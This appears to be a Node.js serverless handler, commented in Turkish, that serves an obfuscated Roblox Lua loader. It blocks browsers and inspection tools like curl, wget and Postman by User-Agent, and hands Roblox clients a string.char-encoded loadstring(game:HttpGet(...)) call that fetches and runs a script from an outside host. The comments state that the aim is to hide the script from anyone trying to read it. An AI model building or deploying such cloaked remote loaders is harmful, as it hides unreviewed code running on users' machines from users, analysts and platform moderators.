module.exports = async function(req, res) {
  const userAgent = (req.headers['user-agent'] || '').toLowerCase();

  const isRoblox = userAgent.includes('roblox');

  const browserSignatures = [
    'mozilla', 'chrome', 'safari', 'firefox', 'edge', 'opera',
    'msie', 'trident', 'gecko', 'webkit', 'applewebkit', 'blink',
    'brave', 'vivaldi', 'seamonkey', 'curl', 'wget', 'postman',
    'insomnia', 'python-requests', 'axios', 'got', 'node-fetch'
  ];

  const isBrowser = browserSignatures.some(sig => userAgent.includes(sig));

  if (isBrowser && !isRoblox) {
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    return res.status(403).send('Access Denied. You do not have permission to view this script.');
  }

  // Orijinal gizlemek istediğimiz script
  const jnkieScript = 'loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/34792c8829e32dc584472d8a8302775bdb08ed24f53dad9e09f723d78142319c/download"))()';

  // Scripti dinamik matematik formülleriyle şifreliyoruz (Obfuscation)
  // Her istek atıldığında şifreleme sayıları değişeceği için kırmaları imkansıza yakındır.
  let simpleObfuscator = "";
  for (let i = 0; i < jnkieScript.length; i++) {
    const offset = Math.floor(Math.random() * 50) + 10;
    const val = jnkieScript.charCodeAt(i) + offset;
    simpleObfuscator += `string.char(${val} - ${offset})`;
    if (i < jnkieScript.length - 1) simpleObfuscator += "..";
  }

  // Şifrelenmiş kodu Roblox'un çözüp çalıştırması için son rütuş
  const finalLua = `local _c = ${simpleObfuscator}; local _f = loadstring(_c); if _f then _f() end;`;

  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  return res.status(200).send(finalLua);
}
